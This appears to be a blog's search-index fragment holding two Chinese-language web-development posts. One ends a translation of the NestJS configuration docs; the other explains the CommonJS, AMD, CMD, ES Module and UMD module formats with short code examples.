在这个例子中，我们将继续使用class-transformer和class-validator包。首先，我们必须定义。 一个具有验证约束的类， 一个使用 plainToClass 和 validateSync 函数的验证函数。 12345678910111213141516171819202122232425262728293031import { plainToClass } from 'class-transformer';import { IsEnum, IsNumber, validateSync } from 'class-validator';enum Environment { Development = \"development\", Production = \"production\", Test = \"test\", Provision = \"provision\",}class EnvironmentVariables { @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;}export function validate(config: Record&lt;string, unknown&gt;) { const validatedConfig = plainToClass( EnvironmentVariables, config, { enableImplicitConversion: true }, ); const errors = validateSync(validatedConfig, { skipMissingProperties: false }); if (errors.length &gt; 0) { throw new Error(errors.toString()); } return validatedConfig;} 完成这些之后，使用validate函数作为ConfigModule的配置选项，如下所示: 12345678910import { validate } from './env.validation';@Module({ imports: [ ConfigModule.forRoot({ validate, }), ],})export class AppModule {} 自定义getter函数ConfigService定义了一个通用的get()方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。 12345678@Injectable()export class ApiConfigService { constructor(private configService: ConfigService) {} get isAuthEnabled(): boolean { return this.configService.get('AUTH_ENABLED') === 'true'; }} 现在我们可以使用getter函数如下: 12345678@Injectable()export class AppService { constructor(apiConfigService: ApiConfigService) { if (apiConfigService.isAuthEnabled) { // Authentication is enabled } }} 可扩展变量@nestjsconfig支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说 12APP_URL=mywebsite.comSUPPORT_EMAIL=support@${APP_URL} 通过这种结构，变量SUPPORT_EMAIL解析为support@mywebsite.com。请注意使用 ${...} 语法来触发解析 SUPPORT_EMAIL 定义中的变量 APP_URL 的值。 对于这个功能，@nestjsconfig包内部使用dotenv-expand。 使用传递给ConfigModule的forRoot()方法的选项对象中的expandVariables属性启用环境变量扩展，如下所示。 123456789@Module({ imports: [ ConfigModule.forRoot({ // ... expandVariables: true, }), ],})export class AppModule {} 在 main.ts 中使用虽然我们的配置是存储在service中的，但它仍然可以在main.ts文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。 要访问它，你必须使用app.get()方法，然后是服务引用。 1const configService = app.get(ConfigService); 然后，你可以像往常一样，通过调用配置键的get方法来使用它。 1const port = configService.get('PORT'); 本文基本上是官文文档中有关配置部分的中文翻译（https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。"},{"title":"Javascript 模块管理","path":"/2020/08/29/Javascript 模块管理/","content":"CommonJSCommonJS是Node.js对模块开发的标准规范。 CommonJS module基本要求如下： 一个文件就是一个模块，拥有单独的作用域 普通方式定义的 变量、函数、对象都属于该模块内 通过 require 来加载模块 通过 exports 和 module.exports 来暴露模块中的内容 demo1: 1234567891011121314// module.jsmodule.exports = { name: \"zhang\", getName: function() { console.log(this.name); }, changeName: function(n) { this.name = n; }};// index.jsconst module = require(\"./module/index\");console.log(module)\t// {name: \"zhang\", getName: ƒ, changeName: ƒ} \"commons\" demo2: 1234567891011121314// module1.jsconst getParam = () =&gt; { console.log(a);};let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(\"./module/index1\");consoel.log(module1, \"commons1\")\t// {a: 123, b: 456, getParam: ƒ} \"commons1\" demo3: 1234567891011121314151617// module2.jslet a = 123;const getSome = () =&gt; { console.log(\"yyy\");};const getA = () =&gt; { console.log(a);};exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(\"./module/index2\");consoel.log(module2, \"commons2\")\t// function getA() {...} 总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出 exports 和 module.exports 的区别:1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports2、当模块内部全部是 exports 的时候， 就等同于 module.exports3、最后 我们就可以认定为 exports 其实就是 module.exports 的子集。 AMDAMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。 AMD设计出一个简洁的写模块API： define(id?, dependencies?, factory); 其中： id: 模块标识，可以省略。 dependencies: 所依赖的模块，可以省略。 factory: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。 使用RequireJS的require函数加载模块: require([dependencies], callback); dependencies: 表示所依赖的模块 callback: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块 base.js 123456define(function() { return { mix: function(source, target) { } };}); ui.js 1234567define(['base'], function(base) { return { show: function() { // todo with module base } }}); page.js 123define(['data', 'ui'], function(data, ui) { // init here}) data.js 1234define({ users: [], members: []}); 以上同时演示了define的三种用法 定义无依赖的模块（base.js） 定义有依赖的模块（ui.js，page.js） 定义数据对象模块（data.js） CMDAMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules/Wrappings 。所以就有了CMD, 它的语法如下: define(id?, dependencies?, factory); 因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id； CMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。 factory有三个参数： 1function(require, exports, module){} require: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口； exports: exports 是一个对象，用来向外提供模块接口； module: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。 demo: 123456define(function(require, exports, module) { var base = require('base'); exports.show = function() { // todo with module base }}); AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require. AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。 ES Module在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。 export用于对外输出本模块（一个文件可以理解为一个模块）变量的接口import用于导入export导出的模块 1234567891011121314151617181920212223// index.jsexport const fn1 = function () { console.log('fn1')}export const fn2 = function () { console.log('fn2')}const fn = { fn1, fn2}export default fn// index1.jsimport { fn1, fn2 } from 'index.js'fn1() // 'fn1'fn2() // 'fn2' import fn from 'index.js'console.log(fn) // {fn1: ƒ, fn2: ƒ} export 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。 import {fn} from './xxx/xxx' ( export 导出方式的 引用方式 ) import fn from './xxx/xxx1' ( export default 导出方式的 引用方式 ) UMDAMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。 CommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.next/Harmony的模块格式。但它仅支持对象类型（objects）模块。 这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。 UMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。 再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。 下面是一个示例 1234567891011121314151617181920(function (root, factory) { if(typeof exports === 'object' &amp;&amp; typeof module === 'object') module.exports = factory(); else if(typeof define === 'function' &amp;&amp; define.amd) define([], factory); else if(typeof exports === 'object') exports[\"nav\"] = factory(); else root[\"nav\"] = factory();})(window, this, function() { // module return { addEvent: function(el, type, handle) { //... }, removeEvent: function(el, type, handle) { }, };})"}]